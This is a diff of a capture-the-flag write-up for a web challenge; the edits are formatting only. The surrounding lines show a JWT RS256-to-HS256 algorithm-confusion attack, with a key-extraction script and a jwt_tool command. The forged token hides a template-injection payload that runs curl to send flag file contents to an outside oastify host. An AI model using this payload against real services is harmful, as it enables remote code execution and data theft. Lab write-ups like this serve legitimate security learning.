@@ -381,9 +381,9 @@ router.get("/jwks.json", async (req, res) => {
 ```
 ![Cat Club JWK](/assets/img/Intigriti-ctf_2024/cat_club_jwk.png)
 
-#### Let's exploit
-- First, let's create a script to extract and format the public key from the JWKS endpoint: <br>
-```py
+Let's exploit <br>
+First, let's create a script to extract and format the public key from the JWKS endpoint: <br>
+```python
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
 import base64
@@ -417,7 +417,7 @@ with open("public_key.pem", "wb") as f:
 But the JWT is using `RS256` alg so we need to change to `HS256` and then inject payload into username. <br>
 ![Cat Club SSTI](/assets/img/Intigriti-ctf_2024/cat_club_ssti.png)
 
-- Then use jwt_tool to create a malicious token with algorithm confusion: <br>
+Then use jwt_tool to create a malicious token with algorithm confusion: <br>
 ```bash
 python3 jwt_tool.py --exploit k -pk public_key.pem "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7ZnVuY3Rpb24oKXtsb2NhbExvYWQ9Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDtzaD1sb2NhbExvYWQoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjdXJsIHZoZzk4bWxlN21rcTQwZ3lvNHM3MzExZjI2OHh3cmtnLm9hc3RpZnkuY29tYGNhdCAvZmxhZypgJyl9KCl9In0.L8Z5MJNc5VTuBu9w5IFLnE6Slt5H5pJDCd_0xAgstz8"
 ```
